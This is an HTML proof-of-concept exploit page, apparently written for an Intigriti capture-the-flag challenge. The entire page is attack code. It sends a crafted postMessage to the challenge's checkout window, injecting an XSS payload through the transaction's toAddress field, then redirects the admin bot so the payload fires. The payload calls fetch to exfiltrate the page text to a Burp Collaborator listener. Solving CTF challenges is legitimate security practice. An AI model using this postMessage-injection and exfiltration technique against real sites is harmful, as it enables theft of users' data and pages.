<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Intigriti Exploit</title>
</head>
<body>
    <h1>Exploit Sent to Bot...</h1>
    <script>
        // CONFIGURATION
        const BASE_URL = 'https://challenge-0126.intigriti.io';
        
        // Your Burp Collaborator Link
        const LISTENER = 'http://q3u9r6y9limq0is58qfw95crpiv9j07p.oastify.com';

        // 1. Open the checkout page
        // We use currency=1337COIN in the URL to look legit, though not strictly required
        let win = window.open(BASE_URL + '/checkout.html?currency=1337COIN&price=1', '_blank');

        // 2. Wait for the window to load
        setTimeout(() => {
            
            // THE PAYLOAD
            // Breaks out of the title attribute and sends the flag to Burp Collaborator
            const xss = `"><img src=x onerror="fetch('${LISTENER}/?flag='+encodeURIComponent(document.body.innerText))">`;

            // 3. Send the malicious message
            // TARGETING 1337COIN because we know the Admin has millions of it!
            win.postMessage({
                type: 'submitTransaction',
                transaction: {
                    currency: '1337COIN',    // UPDATED: Using the admin's known currency
                    amount: 1337,            // Using a valid amount they can afford
                    toAddress: xss           // The Injection
                }
            }, '*');

            // 4. Redirect the bot to MarketWatch to execute the XSS
            setTimeout(() => {
                win.location = BASE_URL + '/marketwatch.html';
            }, 1500);

        }, 2000);
    </script>
</body>
</html>
